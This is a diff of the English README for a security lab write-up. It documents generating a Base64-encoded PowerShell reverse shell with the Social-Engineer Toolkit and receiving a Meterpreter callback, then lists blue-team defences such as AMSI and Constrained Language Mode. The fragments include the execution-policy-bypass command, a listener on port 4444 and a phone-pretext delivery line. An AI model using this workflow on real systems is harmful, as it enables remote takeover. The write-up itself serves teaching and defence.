@@ -1,6 +1,6 @@
 > **English** | [Italiano](README.md)
 
-# SET PowerShell Attack Vectors: Reverse Shell Encoded Base64
+# SET PowerShell attack vectors: reverse shell encoded base64
 
 > - **Phase:** Social Engineering - PowerShell Attack Vectors - In-Memory Code Execution
 > - **Visibility:** Variable - PowerShell execution can trigger AMSI and Script Block Logging (high visibility if controls are active); reverse shell connection to external IP detectable by firewall/IDS; without active logging, in-memory execution leaves minimal traces
@@ -14,7 +14,7 @@
 
 ---
 
-## Executive Summary
+## Executive summary
 
 PowerShell is the most commonly used execution vector in modern attacks against Windows environments. Its ubiquitous presence (installed by default on every Windows since 2009), the ability to operate entirely in memory, and direct access to .NET APIs make it the ideal tool for malicious code execution post-delivery.
 
@@ -24,7 +24,7 @@ In the lab, the one-liner was generated, executed on the target Windows VM (simu
 
 ---
 
-## Finding SE-006: Encoded PowerShell Reverse Shell with Execution Policy Bypass
+## Finding SE-006: encoded PowerShell reverse shell with execution policy bypass
 
 **Finding ID:** `SE-006` | **Severity:** `High` | **CVSS:** 8.1
 
@@ -32,7 +32,7 @@ An attacker can generate a Base64 encoded PowerShell one-liner that, when execut
 
 **PoC Scenario:** The analyst generates the one-liner via SET, delivers it to the victim (simulating delivery via phone pretext or HTA), and obtains a Meterpreter reverse shell.
 
-### PoC - Phase 1: One-Liner Generation with SET
+### PoC - phase 1: One-Liner generation with SET
 
 ```Bash
 sudo setoolkit
@@ -81,7 +81,7 @@ powershell -W 1 -ExecutionPolicy Bypass -NoProfile -EncodedCommand  <--
 [*] Starting Metasploit multi/handler...
 ```
 
-### PoC - Phase 2: Listener Setup
+### PoC - phase 2: listener setup
 
 SET automatically starts the Metasploit listener (or it can be configured manually).
 
@@ -94,7 +94,7 @@ SET automatically starts the Metasploit listener (or it can be configured manual
 [*] Started reverse TCP handler on 192.168.0.110:4444               <--
 ```
 
-### PoC - Phase 3: Execution on Victim and Callback
+### PoC - phase 3: execution on victim and callback
 
 The PowerShell one-liner is executed on the target Windows VM. In a real scenario, delivery would occur via: phone pretext ("Open PowerShell and paste this command to fix the IT issue"), .hta file (SE-004), Office macro, or direct physical access.
 
@@ -120,7 +120,7 @@ Architecture    : x64
 Meterpreter     : x86/windows
 ```
 
-### PoC - Phase 4: In-Memory Execution Verification
+### PoC - phase 4: In-Memory execution verification
 
 Verification that the payload operates in-memory: no files written to disk, the process resides in the memory of the PowerShell process.
 
@@ -136,11 +136,11 @@ The Meterpreter process lives inside `powershell.exe` (PID 6284). There is no se
 
 ---
 
-## Impact and Remediation (Blue Team)
+## Impact and remediation (blue team)
 
 In-memory PowerShell code execution with reverse shell provides the attacker full remote control of the target system. The absence of files on disk makes detection more difficult for traditional AV solutions based on static scanning.
 
-### Recommended Countermeasures
+### Recommended countermeasures
 
 1. **PowerShell Constrained Language Mode (CLM):** limits PowerShell functionality for non-admin users, blocking access to .NET and COM APIs used by offensive payloads. Configurable via AppLocker or WDAC.
 2. **AMSI (Antimalware Scan Interface):** AMSI inspects decoded PowerShell code before execution, detecting malicious payloads even when Base64 encoded. Active by default from Windows 10.
@@ -151,7 +151,7 @@ In-memory PowerShell code execution with reverse shell provides the attacker ful
 
 ---
 
-## Lab Experience
+## Lab experience
 
 The one-liner generation with SET was immediate: the PowerShell Attack Vectors menu offers four options, of which the Alphanumeric Shellcode Injector is the most versatile. SET generated the payload and offered the option to automatically start the Metasploit listener - a convenience that simplifies the workflow compared to manual configuration.
 
@@ -165,7 +165,7 @@ The most significant observation concerns detection: with active Script Block Lo
 
 ---
 
-## Theoretical Analysis: PowerShell as an Attack Vector
+## Theoretical analysis: PowerShell as an attack vector
 
 PowerShell occupies a unique position in the offensive landscape because it is simultaneously a legitimate administration tool and a powerful attack vector. This duality makes it a quintessential LOLBIN (Living Off the Land Binary): its use cannot simply be blocked without operational impact.
 
@@ -199,11 +199,11 @@ The main mitigation (AMSI) works by intercepting decoded content before executio
 
 ---
 
-## Real-World Scenario: PowerShell Fileless Attack in Enterprise Environment
+## Real-World scenario: PowerShell fileless attack in enterprise environment
 
 > This section describes how SE-006 would fit into a real engagement against an enterprise Windows environment.
 
-### Attacker Perspective (Red Team)
+### Attacker perspective (red team)
 
 **Starting point:** initial access obtained (via SE-003 credential harvesting, SE-004 spear-phishing, or VPN access with compromised credentials); need to establish an interactive shell on a target Windows host without writing files to disk to avoid signature-based AV detection.
 
@@ -236,7 +236,7 @@ Domain Compromise -> Persistence (Golden Ticket, Scheduled Task)
 
 **Potential impact:** the fileless PowerShell reverse shell is the starting point for any post-exploitation operation in a Windows environment. The ability to operate in-memory without touching disk makes detection significantly more difficult for organizations that have not implemented AMSI, Script Block Logging, and EDR.
 
-### Defender Perspective (Blue Team)
+### Defender perspective (blue team)
 
 **Detection:** defense against fileless PowerShell attacks is articulated across three complementary levels.
 
@@ -256,13 +256,13 @@ Domain Compromise -> Persistence (Golden Ticket, Scheduled Task)
 
 ---
 
-## MITRE ATT&CK Mapping
+## MITRE ATT&CK mapping
 
-| Tactic | Technique | MITRE ID | Action Description |
+| tactic | technique | mitre id | action description |
 | :--- | :--- | :--- | :--- |
-| Resource Development | Obtain Capabilities: Tool | `T1588.002` | Use of SET for automatic generation of encoded PowerShell one-liner with Meterpreter payload. |
-| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | Execution of Base64 encoded PowerShell one-liner on target Windows to establish in-memory reverse shell. |
-| Defense Evasion | Obfuscated Files or Information | `T1027` | Base64 encoding of PowerShell payload to obfuscate content from visual reading and static pattern matching controls. |
+| resource development | obtain capabilities: tool | `T1588.002` | use of set for automatic generation of encoded powershell one-liner with meterpreter payload. |
+| execution | command and scripting interpreter: powershell | `T1059.001` | execution of base64 encoded powershell one-liner on target windows to establish in-memory reverse shell. |
+| defense evasion | obfuscated files or information | `T1027` | base64 encoding of powershell payload to obfuscate content from visual reading and static pattern matching controls. |
 
 ---
 
